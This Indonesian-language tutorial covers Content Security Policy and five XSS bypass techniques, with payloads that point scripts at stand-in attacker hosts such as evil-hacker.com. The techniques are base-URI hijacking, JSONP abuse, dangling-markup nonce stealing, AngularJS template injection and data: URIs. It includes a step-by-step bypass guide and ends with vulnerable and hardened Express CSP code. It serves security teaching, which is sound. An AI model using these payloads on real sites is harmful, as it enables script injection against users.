@@ -1,0 +1,263 @@
+# Cross-Site Scripting (XSS): Proteksi CSP & Teknik Bypassing CSP
+
+Banyak pengembang merasa aplikasi web mereka sudah 100% aman dari XSS hanya karena telah menambahkan header **Content Security Policy (CSP)**. Namun dalam praktiknya, **lebih dari 90% konfigurasi CSP di dunia nyata memiliki celah salah konfigurasi (*misconfiguration*)** yang memungkinkan penyerang tetap mengeksekusi JavaScript.
+
+Materi ini membahas anatomi proteksi CSP, cara menganalisis kebijakan (*policy*), hingga teknik-teknik **CSP Bypass** tingkat lanjut yang sering ditemukan dalam pengujian penetrasi dan lab keamanan PortSwigger.
+
+---
+
+## 1. Apa Itu Content Security Policy (CSP)?
+
+**Content Security Policy (CSP)** adalah mekanisme keamanan browser berbasis HTTP Header (`Content-Security-Policy`) yang berfungsi sebagai **lapisan pertahanan kedua (*Defense-in-Depth*)**.
+
+Tujuan utama CSP adalah membatasi dari mana saja browser diizinkan memuat dan mengeksekusi sumber daya (*scripts, images, stylesheets, objects, fonts*).
+
+### Contoh Header CSP Sederhana:
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
+```
+
+Jika terjadi celah XSS di mana penyerang menyisipkan `<script>alert(1)</script>` atau `<script src="https://evil.com/xss.js">`, browser akan **menolak mengeksekusi skrip tersebut** karena tidak memenuhi aturan CSP yang didefinisikan server!
+
+---
+
+## 2. Matriks Anatomi & 4 Vektor Bypass CSP
+
+![CSP Defense & Bypass Matrix](/images/xss-csp-bypass-matrix.svg)
+
+---
+
+## 3. Direktif Kunci CSP yang Wajib Dipahami
+
+| Direktif | Fungsi & Makna Keamanan |
+| :--- | :--- |
+| **`script-src`** | Mengatur dari mana saja file JavaScript boleh dimuat dan dieksekusi. |
+| **`default-src`** | Fallback default jika direktif spesifik tidak didefinisikan. |
+| **`base-uri`** | Mengatur URL dasar dokumen (tag `<base href="...">`). **Ketiadaan direktif ini adalah celah fatal!** |
+| **`object-src`** | Mengontrol pemuatan plugin browser seperti Flash, Java applets. Wajib disetel ke `'none'`. |
+| **`nonce-{random}`** | String acak kriptografis unik per-request. Hanya tag `<script nonce="...">` yang cocok yang boleh dieksekusi. |
+| **`'strict-dynamic'`** | Memberikan kepercayaan transitif: script ber-nonce yang sah boleh memuat script turunan dinamis. |
+| **`'unsafe-inline'`** | Mengizinkan eksekusi inline script `<script>...</script>` dan event handler `onclick="..."` (sangat berbahaya). |
+| **`'unsafe-eval'`** | Mengizinkan penggunaan `eval()`, `Function()`, `setTimeout("...")`. |
+
+---
+
+## 4. Katalog 5 Teknik CSP Bypass Paling Populer
+
+Berikut adalah teknik-teknik utama yang digunakan penyerang dan bug hunter untuk membobol proteksi CSP:
+
+---
+
+### Bypass 1: Base-URI Hijacking (Ketiadaan Direktif `base-uri`)
+
+Ini adalah teknik bypass paling elegan pada website yang menggunakan CSP Nonce ketat (`script-src 'nonce-xyz'`), tetapi **lupa menyetel direktif `base-uri 'none'` atau `base-uri 'self'`**.
+
+#### Skenario di Halaman Target:
+Server menerapkan CSP ketat:
+```http
+Content-Security-Policy: default-src 'self'; script-src 'nonce-K3yR4nd0m123';
+```
+Dan di dalam kode HTML server, terdapat script bawaan aplikasi yang menggunakan path relatif:
+```html
+<!-- Script resmi aplikasi yang memiliki nonce valid -->
+<script nonce="K3yR4nd0m123" src="/static/js/main.js"></script>
+```
+
+#### Cara Eksploitasi:
+Penyerang menyuntikkan tag `<base>` ke dalam halaman yang rentan injeksi HTML:
+```html
+<base href="https://evil-hacker.com/">
+```
+
+#### Mengapa Berhasil?
+1. Tag `<base>` mengubah root URL dokumen.
+2. Ketika peramban membaca `<script nonce="K3yR4nd0m123" src="/static/js/main.js">`, peramban akan memuat script dari:
+   `https://evil-hacker.com/static/js/main.js`
+3. Karena script tersebut **membawa atribut nonce asli milik server**, peramban mengizinkan eksekusi script jahat penyerang secara penuh!
+
+---
+
+### Bypass 2: JSONP Endpoint Abuse pada Domain Whitelist
+
+Banyak developer mengizinkan domain CDN besar pada CSP mereka:
+```http
+Content-Security-Policy: script-src 'self' https://*.google.com https://cdnjs.cloudflare.com;
+```
+
+#### Cara Eksploitasi:
+Banyak layanan Google atau CDN memiliki endpoint **JSONP (JSON with Padding)** yang mengembalikan fungsi JavaScript berdasarkan parameter `callback`:
+
+```html
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
+```
+
+#### Mengapa Berhasil?
+1. Domain `accounts.google.com` cocok dengan whitelist CSP (`https://*.google.com`).
+2. Server Google merespons dengan konten JavaScript: `alert(document.domain)({"status":"ok"})`.
+3. Peramban mengeksekusi respon tersebut tanpa melanggar aturan CSP!
+
+---
+
+### Bypass 3: Nonce Stealing via Dangling Markup (Penyerapan Nonce)
+
+Jika input pengguna disuntikkan **tepat sebelum** tag script ber-nonce milik server:
+
+#### Kondisi HTML Asli Server:
+```html
+<div class="user-content">USER_INPUT</div>
+<!-- Script sah server tepat di bawah input pengguna -->
+<script nonce="SecretNonce12345" src="/app.js"></script>
+```
+
+#### Payload Dangling Injeksi:
+Penyerang mengirim tag `<script src="...">` yang **tidak ditutup**:
+```html
+<script src="https://evil-hacker.com/malicious.js"
+```
+
+#### Hasil di HTML Browser:
+```html
+<div class="user-content"><script src="https://evil-hacker.com/malicious.js" 
+<script nonce="SecretNonce12345" src="/app.js"></script>
+```
+Parser HTML peramban akan menggabungkan tag terbuka milik penyerang dengan atribut `nonce="SecretNonce12345"` milik script server, sehingga script jahat penyerang dieksekusi karena memiliki nonce sah!
+
+---
+
+### Bypass 4: Client-Side Template Injection (AngularJS Gadgets)
+
+Jika CSP melarang inline script (`'unsafe-inline'` diblokir) dan tidak ada nonce, tetapi website memuat framework frontend seperti AngularJS dari domain sendiri atau CDN:
+
+```http
+Content-Security-Policy: script-src 'self' https://ajax.googleapis.com;
+```
+
+#### Cara Eksploitasi:
+Penyerang tidak menyisipkan tag `<script>`, melainkan ekspresi template AngularJS:
+```html
+<div ng-app ng-csp>
+  {{$on.constructor('alert(document.domain)')()}}
+</div>
+```
+
+#### Mengapa Berhasil?
+Kode JavaScript tidak dieksekusi langsung oleh parser browser (yang dibatasi CSP), melainkan dievaluasi oleh mesin kompilasi template AngularJS yang sudah di-load secara sah!
+
+---
+
+### Bypass 5: Celah Nilai `data:` URI & `unsafe-eval`
+
+Jika CSP mengizinkan skema `data:` pada `script-src` atau menyertakan keyword `'unsafe-eval'`:
+```http
+Content-Security-Policy: script-src 'self' 'unsafe-eval' data:;
+```
+
+Penyerang dapat langsung memuat skrip Base64 via data URI atau mengeksekusi payload via `eval()`:
+```html
+<script src="data:text/javascript,alert(document.domain)"></script>
+```
+
+---
+
+## 5. Panduan Praktis Langkah Demi Langkah Menguji & Mem-Bypass CSP
+
+Berikut panduan sistematis saat menemukan target yang dilindungi CSP:
+
+---
+
+### Langkah 1: Ekstrak Header CSP Target
+Di Burp Suite, periksa response header dari target:
+```http
+HTTP/1.1 200 OK
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz' https://trusted-cdn.com;
+```
+
+---
+
+### Langkah 2: Evaluasi Kelemahan Kebijakan Menggunakan Tool
+Salin isi header CSP dan tempelkan ke **Google CSP Evaluator** (`https://csp-evaluator.withgoogle.com/`). Tool ini akan langsung menandai celah-celah kritis:
+* Apakah `base-uri` hilang? → Targetkan **Base-URI Hijacking**.
+* Apakah ada domain CDN dengan endpoint JSONP? → Targetkan **JSONP Abuse**.
+* Apakah ada `unsafe-inline` atau `data:`? → Targetkan **Inline / Data URI Injection**.
+
+---
+
+### Langkah 3: Rancang Payload Sesuai Kelemahan & Verifikasi PoC
+1. Buat payload khusus (misalnya `<base href="https://exploit-server.net/">`).
+2. Siapkan file eksploitasi JavaScript di exploit server.
+3. Buka halaman target dan pastikan pop-up `alert(document.domain)` berhasil dieksekusi tanpa diblokir oleh browser console (*Content Security Policy: The page’s settings blocked the loading of a resource...*).
+
+---
+
+## 6. Bedah Kode Backend: Konfigurasi CSP Rentan vs Strict CSP Standar
+
+### ❌ Contoh Konfigurasi CSP yang Rentan (Banyak Celah)
+```typescript
+import express from "express";
+const app = express();
+
+// ❌ RENTAN: Menggunakan Whitelist Domain CDN & Tidak Ada base-uri
+app.use((req, res, next) => {
+  res.setHeader(
+    "Content-Security-Policy",
+    "default-src 'self'; script-src 'self' https://*.google.com https://cdnjs.cloudflare.com 'unsafe-eval';"
+  );
+  next();
+});
+```
+
+---
+
+### ✅ Contoh Konfigurasi Strict CSP yang Aman (Google & OWASP Standard)
+```typescript
+import express from "express";
+import crypto from "crypto";
+import helmet from "helmet";
+
+const app = express();
+
+// 1. Generate Nonce Unik Kriptografis per Request
+app.use((req, res, next) => {
+  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
+  next();
+});
+
+// 2. Terapkan Strict CSP (Nonce-Based + Strict-Dynamic)
+app.use((req, res, next) => {
+  const nonce = res.locals.cspNonce;
+  res.setHeader(
+    "Content-Security-Policy",
+    [
+      `script-src 'nonce-${nonce}' 'strict-dynamic'`, // Mengizinkan hanya script ber-nonce sah
+      "object-src 'none'",                            // Memblokir Flash & Object plugins
+      "base-uri 'none'",                              // ✅ KUNCI: Menutup celah Base-URI Hijacking
+      "frame-ancestors 'none'",                       // Mencegah Clickjacking
+      "require-trusted-types-for 'script'",           // Mencegah DOM XSS Sinks
+    ].join("; ")
+  );
+  next();
+});
+
+app.get("/", (req, res) => {
+  // Hanya script dengan nonce yang cocok yang boleh dieksekusi
+  res.send(`
+    <html>
+      <head>
+        <script nonce="${res.locals.cspNonce}" src="/static/app.js"></script>
+      </head>
+      <body>
+        <h1>Aplikasi Web Terproteksi Strict CSP</h1>
+      </body>
+    </html>
+  `);
+});
+```
+
+---
+
+## 7. Ringkasan Prinsip Keamanan CSP
+
+1. **Selalu Tentukan `base-uri 'none'` atau `base-uri 'self'`:** Jangan pernah membiarkan tag `<base>` dimanipulasi penyerang.
+2. **Hindari Whitelist Domain Pihak Ketiga:** Gunakan **Strict CSP berbasis Nonce (`'nonce-...' 'strict-dynamic'`)** daripada membuat whitelist domain yang rawan JSONP abuse.
+3. **Selalu Setel `object-src 'none'`:** Mencegah eksploitasi via plugin objek lawas.
+4. **Ingat Bahwa CSP Adalah Lapisan Kedua:** CSP bukan pengganti sanitasi input dan context-aware output encoding. Pertahanan utama tetap berada pada sanitasi dan pembersihan data di kode aplikasi.
